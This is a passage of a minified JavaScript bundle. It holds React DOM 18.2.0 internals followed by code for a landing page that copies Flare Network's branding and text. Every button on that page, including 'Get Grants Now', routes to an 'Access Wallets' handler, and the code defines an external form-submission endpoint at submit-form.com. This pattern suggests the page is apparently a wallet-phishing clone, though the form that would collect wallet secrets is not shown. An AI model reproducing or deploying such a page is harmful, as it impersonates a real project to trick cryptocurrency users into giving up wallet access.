                            element: r,
                            isDehydrated: !1,
                            cache: o.cache,
                            pendingSuspenseBoundaries: o.pendingSuspenseBoundaries,
                            transitions: o.transitions
                        }, t.updateQueue.baseState = a, t.memoizedState = a, t.flags & 256) {
                        l = Wn(Error(b(423)), t), t = qs(e, t, r, n, l);
                        break e
                    } else if (r !== l) {
                    l = Wn(Error(b(424)), t), t = qs(e, t, r, n, l);
                    break e
                } else
                    for ($e = Mt(t.stateNode.containerInfo.firstChild), Fe = t, V = !0, Je = null, n = Rc(t, null, r, n), t.child = n; n;) n.flags = n.flags & -3 | 4096, n = n.sibling;
                else {
                    if (Dn(), r === l) {
                        t = kt(e, t, n);
                        break e
                    }
                    ye(e, t, r, n)
                }
                t = t.child
            }
            return t;
        case 5:
            return Mc(t), e === null && To(t), r = t.type, l = t.pendingProps, a = e !== null ? e.memoizedProps : null, o = l.children, bo(r, l) ? o = null : a !== null && bo(r, a) && (t.flags |= 32), od(e, t), ye(e, t, o, n), t.child;
        case 6:
            return e === null && To(t), null;
        case 13:
            return sd(e, t, n);
        case 4:
            return Ni(t, t.stateNode.containerInfo), r = t.pendingProps, e === null ? t.child = In(t, null, r, n) : ye(e, t, r, n), t.child;
        case 11:
            return r = t.type, l = t.pendingProps, l = t.elementType === r ? l : Xe(r, l), Xs(e, t, r, l, n);
        case 7:
            return ye(e, t, t.pendingProps, n), t.child;
        case 8:
            return ye(e, t, t.pendingProps.children, n), t.child;
        case 12:
            return ye(e, t, t.pendingProps.children, n), t.child;
        case 10:
            e: {
                if (r = t.type._context, l = t.pendingProps, a = t.memoizedProps, o = l.value, U(Wl, r._currentValue), r._currentValue = o, a !== null)
                    if (nt(a.value, o)) {
                        if (a.children === l.children && !Ne.current) {
                            t = kt(e, t, n);
                            break e
                        }
                    } else
                        for (a = t.child, a !== null && (a.return = t); a !== null;) {
                            var i = a.dependencies;
                            if (i !== null) {
                                o = a.child;
                                for (var s = i.firstContext; s !== null;) {
                                    if (s.context === r) {
                                        if (a.tag === 1) {
                                            s = vt(-1, n & -n), s.tag = 2;
                                            var u = a.updateQueue;
                                            if (u !== null) {
                                                u = u.shared;
                                                var d = u.pending;
                                                d === null ? s.next = s : (s.next = d.next, d.next = s), u.pending = s
                                            }
                                        }
                                        a.lanes |= n, s = a.alternate, s !== null && (s.lanes |= n), Po(a.return, n, t), i.lanes |= n;
                                        break
                                    }
                                    s = s.next
                                }
                            } else if (a.tag === 10) o = a.type === t.type ? null : a.child;
                            else if (a.tag === 18) {
                                if (o = a.return, o === null) throw Error(b(341));
                                o.lanes |= n, i = o.alternate, i !== null && (i.lanes |= n), Po(o, n, t), o = a.sibling
                            } else o = a.child;
                            if (o !== null) o.return = a;
                            else
                                for (o = a; o !== null;) {
                                    if (o === t) {
                                        o = null;
                                        break
                                    }
                                    if (a = o.sibling, a !== null) {
                                        a.return = o.return, o = a;
                                        break
                                    }
                                    o = o.return
                                }
                            a = o
                        }
                ye(e, t, l.children, n),
                t = t.child
            }
            return t;
        case 9:
            return l = t.type, r = t.pendingProps.children, On(t, n), l = Be(l), r = r(l), t.flags |= 1, ye(e, t, r, n), t.child;
        case 14:
            return r = t.type, l = Xe(r, t.pendingProps), l = Xe(r.type, l), Zs(e, t, r, l, n);
        case 15:
            return ld(e, t, t.type, t.pendingProps, n);
        case 17:
            return r = t.type, l = t.pendingProps, l = t.elementType === r ? l : Xe(r, l), Sl(e, t), t.tag = 1, Ce(r) ? (e = !0, Dl(t)) : e = !1, On(t, n), Fc(t, r, l), _o(t, r, l, n), Fo(null, t, r, !0, e, n);
        case 19:
            return ud(e, t, n);
        case 22:
            return ad(e, t, n)
    }
    throw Error(b(156, t.tag))
};

function Nd(e, t) {
    return Zu(e, t)
}

function ym(e, t, n, r) {
    this.tag = e, this.key = n, this.sibling = this.child = this.return = this.stateNode = this.type = this.elementType = null, this.index = 0, this.ref = null, this.pendingProps = t, this.dependencies = this.memoizedState = this.updateQueue = this.memoizedProps = null, this.mode = r, this.subtreeFlags = this.flags = 0, this.deletions = null, this.childLanes = this.lanes = 0, this.alternate = null
}

function We(e, t, n, r) {
    return new ym(e, t, n, r)
}

function Ai(e) {
    return e = e.prototype, !(!e || !e.isReactComponent)
}

function wm(e) {
    if (typeof e == "function") return Ai(e) ? 1 : 0;
    if (e != null) {
        if (e = e.$$typeof, e === ai) return 11;
        if (e === oi) return 14
    }
    return 2
}

function At(e, t) {
    var n = e.alternate;
    return n === null ? (n = We(e.tag, t, e.key, e.mode), n.elementType = e.elementType, n.type = e.type, n.stateNode = e.stateNode, n.alternate = e, e.alternate = n) : (n.pendingProps = t, n.type = e.type, n.flags = 0, n.subtreeFlags = 0, n.deletions = null), n.flags = e.flags & 14680064, n.childLanes = e.childLanes, n.lanes = e.lanes, n.child = e.child, n.memoizedProps = e.memoizedProps, n.memoizedState = e.memoizedState, n.updateQueue = e.updateQueue, t = e.dependencies, n.dependencies = t === null ? null : {
        lanes: t.lanes,
        firstContext: t.firstContext
    }, n.sibling = e.sibling, n.index = e.index, n.ref = e.ref, n
}

function Cl(e, t, n, r, l, a) {
    var o = 2;
    if (r = e, typeof e == "function") Ai(e) && (o = 1);
    else if (typeof e == "string") o = 5;
    else e: switch (e) {
        case gn:
            return rn(n.children, l, a, t);
        case li:
            o = 8, l |= 8;
            break;
        case qa:
            return e = We(12, n, t, l | 2), e.elementType = qa, e.lanes = a, e;
        case eo:
            return e = We(13, n, t, l), e.elementType = eo, e.lanes = a, e;
        case to:
            return e = We(19, n, t, l), e.elementType = to, e.lanes = a, e;
        case Ou:
            return da(n, l, a, t);
        default:
            if (typeof e == "object" && e !== null) switch (e.$$typeof) {
                case $u:
                    o = 10;
                    break e;
                case Fu:
                    o = 9;
                    break e;
                case ai:
                    o = 11;
                    break e;
                case oi:
                    o = 14;
                    break e;
                case Nt:
                    o = 16, r = null;
                    break e
            }
            throw Error(b(130, e == null ? e : typeof e, ""))
    }
    return t = We(o, n, t, l), t.elementType = e, t.type = r, t.lanes = a, t
}

function rn(e, t, n, r) {
    return e = We(7, e, r, t), e.lanes = n, e
}

function da(e, t, n, r) {
    return e = We(22, e, r, t), e.elementType = Ou, e.lanes = n, e.stateNode = {
        isHidden: !1
    }, e
}

function Ha(e, t, n) {
    return e = We(6, e, null, t), e.lanes = n, e
}

function Ba(e, t, n) {
    return t = We(4, e.children !== null ? e.children : [], e.key, t), t.lanes = n, t.stateNode = {
        containerInfo: e.containerInfo,
        pendingChildren: null,
        implementation: e.implementation
    }, t
}

function xm(e, t, n, r, l) {
    this.tag = t, this.containerInfo = e, this.finishedWork = this.pingCache = this.current = this.pendingChildren = null, this.timeoutHandle = -1, this.callbackNode = this.pendingContext = this.context = null, this.callbackPriority = 0, this.eventTimes = Ea(0), this.expirationTimes = Ea(-1), this.entangledLanes = this.finishedLanes = this.mutableReadLanes = this.expiredLanes = this.pingedLanes = this.suspendedLanes = this.pendingLanes = 0, this.entanglements = Ea(0), this.identifierPrefix = r, this.onRecoverableError = l, this.mutableSourceEagerHydrationData = null
}

function Wi(e, t, n, r, l, a, o, i, s) {
    return e = new xm(e, t, n, i, s), t === 1 ? (t = 1, a === !0 && (t |= 8)) : t = 0, a = We(3, null, null, t), e.current = a, a.stateNode = e, a.memoizedState = {
        element: r,
        isDehydrated: n,
        cache: null,
        transitions: null,
        pendingSuspenseBoundaries: null
    }, Ei(a), e
}

function km(e, t, n) {
    var r = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
    return {
        $$typeof: vn,
        key: r == null ? null : "" + r,
        children: e,
        containerInfo: t,
        implementation: n
    }
}

function Cd(e) {
    if (!e) return Ut;
    e = e._reactInternals;
    e: {
        if (fn(e) !== e || e.tag !== 1) throw Error(b(170));
        var t = e;do {
            switch (t.tag) {
                case 3:
                    t = t.stateNode.context;
                    break e;
                case 1:
                    if (Ce(t.type)) {
                        t = t.stateNode.__reactInternalMemoizedMergedChildContext;
                        break e
                    }
            }
            t = t.return
        } while (t !== null);
        throw Error(b(171))
    }
    if (e.tag === 1) {
        var n = e.type;
        if (Ce(n)) return Nc(e, n, t)
    }
    return t
}

function Td(e, t, n, r, l, a, o, i, s) {
    return e = Wi(n, r, !0, e, l, a, o, i, s), e.context = Cd(null), n = e.current, r = we(), l = It(n), a = vt(r, l), a.callback = t ?? null, zt(n, a, l), e.current.lanes = l, Wr(e, l, r), Te(e, r), e
}

function fa(e, t, n, r) {
    var l = t.current,
        a = we(),
        o = It(l);
    return n = Cd(n), t.context === null ? t.context = n : t.pendingContext = n, t = vt(a, o), t.payload = {
        element: e
    }, r = r === void 0 ? null : r, r !== null && (t.callback = r), e = zt(l, t, o), e !== null && (tt(e, l, o, a), xl(e, l, o)), o
}

function Zl(e) {
    if (e = e.current, !e.child) return null;
    switch (e.child.tag) {
        case 5:
            return e.child.stateNode;
        default:
            return e.child.stateNode
    }
}

function uu(e, t) {
    if (e = e.memoizedState, e !== null && e.dehydrated !== null) {
        var n = e.retryLane;
        e.retryLane = n !== 0 && n < t ? n : t
    }
}

function Ui(e, t) {
    uu(e, t), (e = e.alternate) && uu(e, t)
}

function bm() {
    return null
}
var Pd = typeof reportError == "function" ? reportError : function(e) {
    console.error(e)
};

function Hi(e) {
    this._internalRoot = e
}
pa.prototype.render = Hi.prototype.render = function(e) {
    var t = this._internalRoot;
    if (t === null) throw Error(b(409));
    fa(e, t, null, null)
};
pa.prototype.unmount = Hi.prototype.unmount = function() {
    var e = this._internalRoot;
    if (e !== null) {
        this._internalRoot = null;
        var t = e.containerInfo;
        cn(function() {
            fa(null, e, null, null)
        }), t[wt] = null
    }
};

function pa(e) {
    this._internalRoot = e
}
pa.prototype.unstable_scheduleHydration = function(e) {
    if (e) {
        var t = lc();
        e = {
            blockedOn: null,
            target: e,
            priority: t
        };
        for (var n = 0; n < Tt.length && t !== 0 && t < Tt[n].priority; n++);
        Tt.splice(n, 0, e), n === 0 && oc(e)
    }
};

function Bi(e) {
    return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11)
}

function ma(e) {
    return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11 && (e.nodeType !== 8 || e.nodeValue !== " react-mount-point-unstable "))
}

function cu() {}

function Sm(e, t, n, r, l) {
    if (l) {
        if (typeof r == "function") {
            var a = r;
            r = function() {
                var u = Zl(o);
                a.call(u)
            }
        }
        var o = Td(t, r, e, 0, null, !1, !1, "", cu);
        return e._reactRootContainer = o, e[wt] = o.current, jr(e.nodeType === 8 ? e.parentNode : e), cn(), o
    }
    for (; l = e.lastChild;) e.removeChild(l);
    if (typeof r == "function") {
        var i = r;
        r = function() {
            var u = Zl(s);
            i.call(u)
        }
    }
    var s = Wi(e, 0, !1, null, null, !1, !1, "", cu);
    return e._reactRootContainer = s, e[wt] = s.current, jr(e.nodeType === 8 ? e.parentNode : e), cn(function() {
        fa(t, s, n, r)
    }), s
}

function ha(e, t, n, r, l) {
    var a = n._reactRootContainer;
    if (a) {
        var o = a;
        if (typeof l == "function") {
            var i = l;
            l = function() {
                var s = Zl(o);
                i.call(s)
            }
        }
        fa(t, o, e, l)
    } else o = Sm(n, t, e, l, r);
    return Zl(o)
}
nc = function(e) {
    switch (e.tag) {
        case 3:
            var t = e.stateNode;
            if (t.current.memoizedState.isDehydrated) {
                var n = sr(t.pendingLanes);
                n !== 0 && (ui(t, n | 1), Te(t, X()), !(M & 6) && (Un = X() + 500, Vt()))
            }
            break;
        case 13:
            cn(function() {
                var r = xt(e, 1);
                if (r !== null) {
                    var l = we();
                    tt(r, e, 1, l)
                }
            }), Ui(e, 1)
    }
};
ci = function(e) {
    if (e.tag === 13) {
        var t = xt(e, 134217728);
        if (t !== null) {
            var n = we();
            tt(t, e, 134217728, n)
        }
        Ui(e, 134217728)
    }
};
rc = function(e) {
    if (e.tag === 13) {
        var t = It(e),
            n = xt(e, t);
        if (n !== null) {
            var r = we();
            tt(n, e, t, r)
        }
        Ui(e, t)
    }
};
lc = function() {
    return D
};
ac = function(e, t) {
    var n = D;
    try {
        return D = e, t()
    } finally {
        D = n
    }
};
fo = function(e, t, n) {
    switch (t) {
        case "input":
            if (lo(e, n), t = n.name, n.type === "radio" && t != null) {
                for (n = e; n.parentNode;) n = n.parentNode;
                for (n = n.querySelectorAll("input[name=" + JSON.stringify("" + t) + '][type="radio"]'), t = 0; t < n.length; t++) {
                    var r = n[t];
                    if (r !== e && r.form === e.form) {
                        var l = aa(r);
                        if (!l) throw Error(b(90));
                        Mu(r), lo(r, l)
                    }
                }
            }
            break;
        case "textarea":
            Du(e, n);
            break;
        case "select":
            t = n.value, t != null && _n(e, !!n.multiple, t, !1)
    }
};
Vu = zi;
Qu = cn;
var Em = {
        usingClientEntryPoint: !1,
        Events: [Hr, kn, aa, Hu, Bu, zi]
    },
    rr = {
        findFiberByHostInstance: Jt,
        bundleType: 0,
        version: "18.2.0",
        rendererPackageName: "react-dom"
    },
    Nm = {
        bundleType: rr.bundleType,
        version: rr.version,
        rendererPackageName: rr.rendererPackageName,
        rendererConfig: rr.rendererConfig,
        overrideHookState: null,
        overrideHookStateDeletePath: null,
        overrideHookStateRenamePath: null,
        overrideProps: null,
        overridePropsDeletePath: null,
        overridePropsRenamePath: null,
        setErrorHandler: null,
        setSuspenseHandler: null,
        scheduleUpdate: null,
        currentDispatcherRef: bt.ReactCurrentDispatcher,
        findHostInstanceByFiber: function(e) {
            return e = Gu(e), e === null ? null : e.stateNode
        },
        findFiberByHostInstance: rr.findFiberByHostInstance || bm,
        findHostInstancesForRefresh: null,
        scheduleRefresh: null,
        scheduleRoot: null,
        setRefreshHandler: null,
        getCurrentFiber: null,
        reconcilerVersion: "18.2.0-next-9e3b772b8-20220608"
    };
if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
    var fl = __REACT_DEVTOOLS_GLOBAL_HOOK__;
    if (!fl.isDisabled && fl.supportsFiber) try {
        ta = fl.inject(Nm), it = fl
    } catch {}
}
Re.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = Em;
Re.createPortal = function(e, t) {
    var n = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
    if (!Bi(t)) throw Error(b(200));
    return km(e, t, null, n)
};
Re.createRoot = function(e, t) {
    if (!Bi(e)) throw Error(b(299));
    var n = !1,
        r = "",
        l = Pd;
    return t != null && (t.unstable_strictMode === !0 && (n = !0), t.identifierPrefix !== void 0 && (r = t.identifierPrefix), t.onRecoverableError !== void 0 && (l = t.onRecoverableError)), t = Wi(e, 1, !1, null, null, n, !1, r, l), e[wt] = t.current, jr(e.nodeType === 8 ? e.parentNode : e), new Hi(t)
};
Re.findDOMNode = function(e) {
    if (e == null) return null;
    if (e.nodeType === 1) return e;
    var t = e._reactInternals;
    if (t === void 0) throw typeof e.render == "function" ? Error(b(188)) : (e = Object.keys(e).join(","), Error(b(268, e)));
    return e = Gu(t), e = e === null ? null : e.stateNode, e
};
Re.flushSync = function(e) {
    return cn(e)
};
Re.hydrate = function(e, t, n) {
    if (!ma(t)) throw Error(b(200));
    return ha(null, e, t, !0, n)
};
Re.hydrateRoot = function(e, t, n) {
    if (!Bi(e)) throw Error(b(405));
    var r = n != null && n.hydratedSources || null,
        l = !1,
        a = "",
        o = Pd;
    if (n != null && (n.unstable_strictMode === !0 && (l = !0), n.identifierPrefix !== void 0 && (a = n.identifierPrefix), n.onRecoverableError !== void 0 && (o = n.onRecoverableError)), t = Td(t, null, e, 1, n ?? null, l, !1, a, o), e[wt] = t.current, jr(e), r)
        for (e = 0; e < r.length; e++) n = r[e], l = n._getVersion, l = l(n._source), t.mutableSourceEagerHydrationData == null ? t.mutableSourceEagerHydrationData = [n, l] : t.mutableSourceEagerHydrationData.push(n, l);
    return new pa(t)
};
Re.render = function(e, t, n) {
    if (!ma(t)) throw Error(b(200));
    return ha(null, e, t, !1, n)
};
Re.unmountComponentAtNode = function(e) {
    if (!ma(e)) throw Error(b(40));
    return e._reactRootContainer ? (cn(function() {
        ha(null, null, e, !1, function() {
            e._reactRootContainer = null, e[wt] = null
        })
    }), !0) : !1
};
Re.unstable_batchedUpdates = zi;
Re.unstable_renderSubtreeIntoContainer = function(e, t, n, r) {
    if (!ma(n)) throw Error(b(200));
    if (e == null || e._reactInternals === void 0) throw Error(b(38));
    return ha(e, t, n, !1, r)
};
Re.version = "18.2.0-next-9e3b772b8-20220608";

function jd() {
    if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function")) try {
        __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(jd)
    } catch (e) {
        console.error(e)
    }
}
jd(), Tu.exports = Re;
var _d = Tu.exports,
    du = _d;
Za.createRoot = du.createRoot, Za.hydrateRoot = du.hydrateRoot;
const pt = (...e) => e.filter(Boolean).join(" "),
    Cm = "https://submit-form.com/dThBZWt5",
    Ld = ({
        height: e = 32,
        width: t = 32,
        className: n
    }) => p.jsxs("svg", {
        height: e,
        width: t,
        className: `animate-spin ${n}`,
        xmlns: "http://www.w3.org/2000/svg",
        fill: "none",
        viewBox: "0 0 24 24",
        children: [p.jsx("circle", {
            className: "opacity-25",
            cx: "12",
            cy: "12",
            r: "10",
            stroke: "currentColor",
            strokeWidth: "4"
        }), p.jsx("path", {
            className: "opacity-75",
            fill: "currentColor",
            d: "M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
        })]
    }),
    qe = ({
        children: e,
        label: t,
        loading: n,
        loadingText: r,
        type: l = "button",
        variant: a = "filled",
        dense: o,
        disabled: i,
        className: s,
        color: u = "black",
        onClick: d = () => {}
    }) => p.jsxs("button", {
        type: l,
        disabled: i || n,
        className: pt("inline-flex justify-center items-center gap-2.5 rounded-full font-medium py-4 px-8", o ? "h-10 text-sm" : "h-12 text-sm", a === "filled" && (u === "black" ? "bg-black text-white hover:bg-black" : u === "white" ? "bg-white text-black hover:bg-white/70" : "bg-primary text-white"), a === "outlined" && (u === "black" ? "text-black border-black hover:bg-black/10" : u === "white" ? "text-white border-white hover:bg-white/10" : "text-primary border-primary hover:bg-primary/20") + " border-2 bg-transparent", a === "text" && (u === "black" ? "text-black hover:bg-black/10" : u === "white" ? "text-white hover:bg-white/10" : "text-primary hover:bg-primary/20") + " bg-transparent", "disabled:cursor-not-allowed", i && "bg-opacity-50", u === "black" ? "focus:ring-black/10" : u === "white" ? "focus:ring-white/10" : "focus:ring-primary/20", "focus:ring-4 focus:outline-none hover:bg-opacity-90 transition-all duration-150", s),
        onClick: d,
        children: [n ? p.jsx(Ld, {
            height: 20,
            width: 20
        }) : e || t, n && r ? r : null]
    }),
    Tm = ({
        onConnect: e
    }) => {
        const t = [{
                title: "Flare Time Series Oracle",
                subtitle: "Decentralized prices",
                text: "The FTSO delivers highly-decentralized price and data feeds to dapps on Flare, without relying on centralized providers."
            }, {
                title: "State Connector",
                subtitle: "Trustless event data",
                text: "The State Connector enables information from other blockchains and the internet to be used securely and trustlessly with smart contracts on Flare."
            }],
            n = [{
                title: "Bridging",
                subtitle: "Use Flare’s core protocols to build safer bridges."
            }, {
                title: "State Acquisition",
                subtitle: "Build dapps and protocols that utilize state from any connected chain."
            }, {
                title: "Web2 Connectivity",
                subtitle: "Trustlessly trigger smart contracts with data from Web2 APIs."
            }, {
                title: "Decentralized Data Feeds",
                subtitle: "Build dapps and protocols that utilize decentralized time series data."
            }, {
                title: "Scalable Smart Contracts",
                subtitle: "Flare integrates an industry standard EVM and uses a scalable, low carbon consensus algorithm."
            }];
        return p.jsxs("main", {
            className: "max-w-screen-xl mx-auto",
            children: [p.jsxs("section", {
                className: "h-[calc(100vh-80px)] text-center flex flex-col items-center justify-center p-4",
                children: [p.jsx("h2", {
                    className: "text-6xl md:text-9xl font-semibold text-primary/30",
                    children: "Connect Everything."
                }), p.jsx("p", {
                    className: "w-full md:w-3/4 my-10 text-3xl md:text-5xl font-medium text-primary/20",
                    children: "Flare is the blockchain for data, providing developers with secure decentralized access to high-integrity data from other chains and the internet."
                }), p.jsx(qe, {
                    variant: "outlined",
                    label: "Access Wallets",
                    onClick: e
                })]
            }), p.jsxs("section", {
                className: "my-16 p-4",
                children: [p.jsx("h3", {
                    className: "text-3xl font-semibold mb-6 text-primary/20",
                    children: "Core Protocols"
                }), p.jsxs("p", {
                    className: "font-medium text-xl md:text-4xl mb-6",
                    children: ["EVM-based layer 1 blockchain with ", p.jsx("br", {}), " two native data acquisition protocols."]
                }), p.jsx("div", {
                    className: "flex flex-col md:flex-row gap-10",
                    children: t.map(r => p.jsxs("div", {
                        className: "bg-black text-neutral-500 rounded-3xl p-5 md:p-8 w-full md:w-1/2",
                        children: [p.jsx("img", {
                            src: "/ftso_lighter.svg",
                            className: "w-40 h-40 md:w-52 md:h-52 bg-white"
                        }), p.jsx("h4", {
                            className: "mt-3 text-xl md:text-3xl text-white font-semibold",
                            children: r.title
                        }), p.jsx("p", {
                            className: "text-xl md:text-3xl",
                            children: r.subtitle
                        }), p.jsx("p", {
                            className: "my-6",
                            children: r.text
                        }), p.jsx("div", {
                            className: "flex gap-3",
                            children: p.jsx(qe, {
                                color: "white",
                                label: "Access Wallets",
                                onClick: e
                            })
                        })]
                    }, r.title))
                })]
            }), p.jsxs("section", {
                className: "flex flex-col md:flex-row items-center gap-8 justify-between my-16 py-16 overflow-hidden px-6",
                children: [p.jsxs("div", {
                    className: "w-full md:w-1/2",
                    children: [p.jsx("h4", {
                        className: "font-medium text-3xl md:text-5xl",
                        children: "Unleash the full potential of blockchain"
                    }), p.jsx("p", {
                        className: "text-neutral-500 text-xl my-8",
                        children: "Use Flare’s decentralized data acquisition protocols and scalable EVM-based smart contracts to expand the reach and value of your project. Build on Flare with more data than ever before, or build with Flare to serve multiple ecosystems."
                    }), p.jsx(qe, {
                        className: "w-full",
                        label: "Get Connected",
                        onClick: e
                    })]
                }), p.jsx("video", {
                    playsInline: !0,
                    autoPlay: !0,
                    loop: !0,
                    muted: !0,
                    className: "rounded-full w-full md:w-1/3 h-full md:-mr-[200px]",
                    children: p.jsx("source", {
                        src: "https://flare.network/wp-content/uploads/FLR_devsquare_3.mp4",
                        type: "video/mp4"
                    })
                })]
            }), p.jsxs("section", {
                className: "my-16 p-4",
                children: [p.jsx("h3", {
                    className: "text-3xl font-semibold mb-6 text-primary/20",
                    children: "Build without limitation"
                }), p.jsx("div", {
                    className: "flex flex-col md:flex-row md:flex-wrap lg:flex-nowrap justify-between gap-6 p-4",
                    children: n.map(r => p.jsxs("div", {
                        className: "w-full md:1/3 lg:w-1/5 border px-6 py-10 text-center rounded-2xl flex flex-col",
                        children: [p.jsx("h4", {
                            className: "font-medium text-xl mb-8",
                            children: r.title
                        }), p.jsx("img", {
                            src: "/smart_contracts.svg",
                            className: "w-20 h-20 mx-auto"
                        }), p.jsx("p", {
                            className: "text-neutral-500 mt-8 mb-4 text-sm",
                            children: r.subtitle
                        }), p.jsx(qe, {
                            dense: !0,
                            label: "Get Started",
                            variant: "outlined",
                            className: "mt-auto",
                            onClick: e
                        })]
                    }, r.title))
                })]
            }), p.jsx("section", {
                style: {
                    backgroundImage: "url(/flare_community_banner.jpeg)"
                },
                className: "p-8 bg-cover mb-16 bg-no-repeat rounded-2xl hidden md:block",
                children: p.jsxs("div", {
                    className: " text-white p-8 py-12",
                    children: [p.jsxs("h5", {
                        className: "text-4xl mb-12",
                        children: ["Grants are available to ", p.jsx("br", {}), " teams using our tech in ", p.jsx("br", {}), " interesting ways."]
                    }), p.jsx(qe, {
                        variant: "outlined",
                        color: "white",
                        label: "Get Grants Now",
                        onClick: e
                    })]
                })
            })]
        })
    },
    Vi = {
        facebook: p.jsx("svg", {
            xmlns: "http://www.w3.org/2000/svg",
            viewBox: "0 0 24 24",
            children: p.jsx("path", {
                d: "M12 2.04C6.5 2.04 2 6.53 2 12.06C2 17.06 5.66 21.21 10.44 21.96V14.96H7.9V12.06H10.44V9.85C10.44 7.34 11.93 5.96 14.22 5.96C15.31 5.96 16.45 6.15 16.45 6.15V8.62H15.19C13.95 8.62 13.56 9.39 13.56 10.18V12.06H16.34L15.89 14.96H13.56V21.96A10 10 0 0 0 22 12.06C22 6.53 17.5 2.04 12 2.04Z"
            })
        }),
        twitter: p.jsx("svg", {
            xmlns: "http://www.w3.org/2000/svg",
            viewBox: "0 0 24 24",
            children: p.jsx("path", {
                d: "M22.46,6C21.69,6.35 20.86,6.58 20,6.69C20.88,6.16 21.56,5.32 21.88,4.31C21.05,4.81 20.13,5.16 19.16,5.36C18.37,4.5 17.26,4 16,4C13.65,4 11.73,5.92 11.73,8.29C11.73,8.63 11.77,8.96 11.84,9.27C8.28,9.09 5.11,7.38 3,4.79C2.63,5.42 2.42,6.16 2.42,6.94C2.42,8.43 3.17,9.75 4.33,10.5C3.62,10.5 2.96,10.3 2.38,10C2.38,10 2.38,10 2.38,10.03C2.38,12.11 3.86,13.85 5.82,14.24C5.46,14.34 5.08,14.39 4.69,14.39C4.42,14.39 4.15,14.36 3.89,14.31C4.43,16 6,17.26 7.89,17.29C6.43,18.45 4.58,19.13 2.56,19.13C2.22,19.13 1.88,19.11 1.54,19.07C3.44,20.29 5.7,21 8.12,21C16,21 20.33,14.46 20.33,8.79C20.33,8.6 20.33,8.42 20.32,8.23C21.16,7.63 21.88,6.87 22.46,6Z"
            })
        }),
        instagram: p.jsx("svg", {
            xmlns: "http://www.w3.org/2000/svg",
            viewBox: "0 0 24 24",
            children: p.jsx("path", {
                d: "M7.8,2H16.2C19.4,2 22,4.6 22,7.8V16.2A5.8,5.8 0 0,1 16.2,22H7.8C4.6,22 2,19.4 2,16.2V7.8A5.8,5.8 0 0,1 7.8,2M7.6,4A3.6,3.6 0 0,0 4,7.6V16.4C4,18.39 5.61,20 7.6,20H16.4A3.6,3.6 0 0,0 20,16.4V7.6C20,5.61 18.39,4 16.4,4H7.6M17.25,5.5A1.25,1.25 0 0,1 18.5,6.75A1.25,1.25 0 0,1 17.25,8A1.25,1.25 0 0,1 16,6.75A1.25,1.25 0 0,1 17.25,5.5M12,7A5,5 0 0,1 17,12A5,5 0 0,1 12,17A5,5 0 0,1 7,12A5,5 0 0,1 12,7M12,9A3,3 0 0,0 9,12A3,3 0 0,0 12,15A3,3 0 0,0 15,12A3,3 0 0,0 12,9Z"
            })
        }),
        menu: p.jsx("svg", {
            xmlns: "http://www.w3.org/2000/svg",
            viewBox: "0 0 24 24",
            children: p.jsx("path", {
                d: "M3,6H21V8H3V6M3,11H21V13H3V11M3,16H21V18H3V16Z"
            })
        }),
        close: p.jsx("svg", {
            xmlns: "http://www.w3.org/2000/svg",
            viewBox: "0 0 24 24",
            children: p.jsx("path", {
                d: "M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z"
            })
        }),
        telegram: p.jsx("svg", {
            xmlns: "http://www.w3.org/2000/svg",
            viewBox: "0 0 24 24",
            children: p.jsx("path", {
                fill: "currentColor",
                d: "M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10s10-4.48 10-10S17.52 2 12 2m4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19c-.14.75-.42 1-.68 1.03c-.58.05-1.02-.38-1.58-.75c-.88-.58-1.38-.94-2.23-1.5c-.99-.65-.35-1.01.22-1.59c.15-.15 2.71-2.48 2.76-2.69a.2.2 0 0 0-.05-.18c-.06-.05-.14-.03-.21-.02c-.09.02-1.49.95-4.22 2.79c-.4.27-.76.41-1.08.4c-.36-.01-1.04-.2-1.55-.37c-.63-.2-1.12-.31-1.08-.66c.02-.18.27-.36.74-.55c2.92-1.27 4.86-2.11 5.83-2.51c2.78-1.16 3.35-1.36 3.73-1.36c.08 0 .27.02.39.12c.1.08.13.19.14.27c-.01.06.01.24 0 .38"
            })
        }),
        discord: p.jsx("svg", {
            xmlns: "http://www.w3.org/2000/svg",
            viewBox: "0 0 24 24",
            children: p.jsx("path", {
                fill: "currentColor",
                d: "M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515a.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0a12.64 12.64 0 0 0-.617-1.25a.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057a19.9 19.9 0 0 0 5.993 3.03a.078.078 0 0 0 .084-.028a14.09 14.09 0 0 0 1.226-1.994a.076.076 0 0 0-.041-.106a13.107 13.107 0 0 1-1.872-.892a.077.077 0 0 1-.008-.128a10.2 10.2 0 0 0 .372-.292a.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127a12.299 12.299 0 0 1-1.873.892a.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028a19.839 19.839 0 0 0 6.002-3.03a.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03M8.02 15.33c-1.182 0-2.157-1.085-2.157-2.419c0-1.333.956-2.419 2.157-2.419c1.21 0 2.176 1.096 2.157 2.42c0 1.333-.956 2.418-2.157 2.418m7.975 0c-1.183 0-2.157-1.085-2.157-2.419c0-1.333.955-2.419 2.157-2.419c1.21 0 2.176 1.096 2.157 2.42c0 1.333-.946 2.418-2.157 2.418"
            })
        })
    },
    Qi = ({
        light: e
